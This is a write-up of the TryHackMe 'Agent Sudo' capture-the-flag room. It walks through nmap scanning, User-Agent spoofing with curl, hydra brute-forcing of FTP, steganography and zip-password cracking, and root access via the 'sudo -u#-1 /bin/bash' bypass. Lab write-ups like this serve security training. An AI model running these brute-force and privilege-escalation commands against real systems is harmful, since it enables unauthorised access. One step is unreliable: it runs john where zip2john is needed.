# Agent-sudo
  ~ https://tryhackme.com/room/agentsudoctf
* ### This is a direct walk-through to the flag. Hopping that you have given your best before referring to this write-up
* ### Assuming that your are using Attack-box or conntected to VPN. If not, do refer to [vpn_connection](https://github.com/shybu9/TRY-HACK-ME/tree/main/OPEN-VPN-CONNECTION "OPEN VPN CONNECTION")

<br>

![agent intro](https://user-images.githubusercontent.com/112984045/200202387-5bdfb2f9-7472-4800-98c3-4be0c7cf5cd6.png)
~ the IP will be given once you join the room and Start Machine succefully after connecting to OPEN-VPN
 
 ## ENUMERATION :

 * For ENUMERATION we use nmap tool which come by default in kali linux.
 <br>command : 
 ```bash
 nmap -sVC -T4 -v <IP> 
 ```
 ![agent nmap](https://user-images.githubusercontent.com/112984045/200202581-9bf78648-dd20-405c-a637-f425b7906587.png)
<br>~ we can add -v argument for more verbose output.
 
 * I usually perform one more scan by using my personal tool : [port-scanner](https://github.com/shy.bu9/portscanner)
 ![agent portscanner](https://user-images.githubusercontent.com/112984045/200202803-394383ff-08e1-482d-81fc-dcf55cb58e0c.png)<br>

  ~ I prefer this tool because of its speed as you can see it just took 858 seconds for scanning 65535 ports.Even still some improvements to be done
 
 ### ANALYSING BOTH SCANS :
 * number of OPEN PORTS : 3
 * PORT NUMBERS : 21,22,80
 * OPERATING SYSTEM : Uinux, Linux
 * service running on PORT 21 : ftp
 * service running on PORT 22 : ssh
 * service running on PORT 80 : http
 
 * As the port 80 is open lets have a look on web pages using IP
 ```bash
 http://<IP>
 ```
 
 <br>
 
 ![agent web](https://user-images.githubusercontent.com/112984045/200203533-42b6d9f3-8958-4fde-9071-022fc1017b4f.png)
  <br> ~ Here we have been redirected to Annoucement page as user-agent.
  
  
 * After reading hint for the next question, we came to know that this is not a browser thing and lets for curl command :
 ```bash
 curl http://<IP> -H "User-Agent : R" -L
 ```
 #### arguments
 ` -H : used for mentioning the host name .i.e User-Agent : R`<br>
 ` -L : used to follow any redirects`
 <br>
 ![agent curlR](https://user-images.githubusercontent.com/112984045/200206715-6a3b72ad-ef57-4f6f-a78b-d1c6e3903f91.png)
<br> ~ the Agent R is talking about other 25 users and hint is given as 'user agent : C'
* Lets curl once again using ' User-Agent : C'
```bash
curl http://<IP> -H "User-Agent : C" -L
```
![agent curlC](https://user-images.githubusercontent.com/112984045/200207134-58f372d6-b46b-4c24-80fc-21ec4f91eb46.png)
<br> ~ Here we came to the name of the Agent and there is one more Agent called Agent-J.

## FOOTHOLD
* Now we have the name of user, maybe we can try bruteforcing the ftp and ssh server.
* By looking at the next question, we go for FTP bruteforce first using hydra command :
```bash
hydra -l < user name that we got in curl > -P < rockyou file including its path> ftp://<IP>
```
![agent hydra](https://user-images.githubusercontent.com/112984045/200208317-9c6e5cda-379d-443e-a591-109cbaca36a2.png)
<br> ~ We have successfully got the username and password for FTP.

<br>

* After logging in to FTP, we can look for files and get them using the commands :
``` bash
ls -la
```
```bash
get cutie.png
```
```bash
get To_agentJ.txt
```
```bash
get cute-alien.jpg
```
![agent ftplogin](https://user-images.githubusercontent.com/112984045/200209136-fb680d99-f316-4702-ba9d-ebbccc994923.png)

<br>

* Now we can read the files using cat command :
```bash
cat To_agentJ.txt 
```
![agent to_agentJ](https://user-images.githubusercontent.com/112984045/200210004-d72412f2-3131-4a9b-ae7e-7010b6d8daae.png)
 <br> ~ Here we can understand that the other two are not just pictures but something is hidden in them.
<br>

` * Insted of john-the-ripper i have used stegcracker which is less complex but time consuming.`
 ![agent stegcracker fail](https://user-images.githubusercontent.com/112984045/200213716-7237b48b-25f7-4a42-9a7f-a2760142500b.png)
 <br> ~ Firstly i have tried to crack 'citie.png' which poped as error. Then gone for the other file 'cute-alien.jpg'.
 <br>
 
 ```bash
 stegcracker cute-alien.jpg
 ```
![agent stegcracker pass](https://user-images.githubusercontent.com/112984045/200214249-01285045-e96d-4442-aaaa-5e57898cc6e1.png)
 <br> 
 ` ~ At this point the FULLNAME of the other Agent and his PASSWORD, These might be the credentials for SSH.`
 
 #### but... wait a minute !!!!
 ![agent zip qa](https://user-images.githubusercontent.com/112984045/200215759-ebda9449-a8dd-4ea1-8f01-20e179c7712c.png)<br>
 #### who are you!
 
 <br>
 
 `* Now we should definetly go for john-the-ripper.`
 <br>
 
 * Firstly, to extract hidden directory use the command :
 ```bash
 sudo binwalk -e cutie.png --run-as=root
 ```
 ![agent binwalk](https://user-images.githubusercontent.com/112984045/200216514-c741df53-5cc1-46e3-a2c2-b8be84f8bade.png)
 <br> ~ There is a zip file here named '8702.zip'.
 * When we try to unzip the file, it redirecting us to To_agentR.txt
  <br>
  * We can use john for here
  * Firstly get the hash into a file by using the command :
  ```bash
  john 8702.zip > zip.hash
  ```
  ![agent hash](https://user-images.githubusercontent.com/112984045/200217404-aff6bfe1-0fba-4a03-80f8-ea7805ad72b7.png)

  
  * Then go for cracking the hash by using the command :
  ```bash
  john zip.hash
  ```
 ![agent upzip](https://user-images.githubusercontent.com/112984045/200217570-c5cf4f16-20e3-4b33-bfdc-b37066202d60.png)
<br> ~ Now we have the password for zip file, we can go for unzip but it is not working properly.

* We have alternate 7z for this, use the command :
```bash
7z e 8702.zip
```
![agent 7z](https://user-images.githubusercontent.com/112984045/200218572-0e649a7b-ec62-4308-986b-cf524ad28b7d.png)
<br> ~ Successfully stored the contents to To_agentR.txt.

* We can have a look, this seems to be one more username which hashed.

<br>

* Let us go for [CyberChef](https://icyberchef.com/) to extract the hash.<br>
![agent cyberchef](https://user-images.githubusercontent.com/112984045/200219353-27119b5d-d9d3-49fc-b430-469b6350b3cd.png)

` I WAS SHOCKED AFTER LOOKING AT THIS OUTPUT `
* This was just the same password which i have very long ago using 'stegcracker'.
<br>

* Ok.. Now let us login to SSH with the credentials we already had we had long ago.
* ![agent userflag](https://user-images.githubusercontent.com/112984045/200223600-afb7329d-6b20-44bc-839a-d8bdc96ead16.png)
<br> ~ I have just loged in and captured the user flag.Then downloaded the 'Alien_autospy.jpg' file using the command : 
```bash
scp <ssh_user@IP>:Alien_autospy.jpg <directory path>
```
![agent scp](https://user-images.githubusercontent.com/112984045/200224880-50e93634-eefc-4412-b06d-5918a0c9c43c.png)

* The image question was a bit tircky. Here we have to search for 'reverse image search' in google.
* Upload the image their and look for FOX-NEWS' articals in results.




## PRIVILEGE ESCALATION :
* Let us check for sudo rights of the user using the command :
``` bash
sudo -l
```
![agent sudo-l](https://user-images.githubusercontent.com/112984045/200225138-dbf7cf90-c0e2-43c3-a99a-7f2dea847c5f.png)
<br> ~ These rights are a bit different.<br>
` the user cannot run /bin/bash as root which is mentioned.`<br>
` but all refer that user can run /bin/bash as any other user.`

* We can directly gain the root access using the command : 
```bash
sudo -u#-1 /bin/bash
```

<br>
* Rather i have searched for google regarding this right.
* I end up using the same command after getting CVE: details on google.
![agent rootflag](https://user-images.githubusercontent.com/112984045/200226962-1c1b493b-a26b-4f54-a154-d7f77fbe2dde.png)
<br> ~ We have successfully escalated to root and captured the flag.
* At last the name of Agent R is revealed, which even i was curious to know.



 
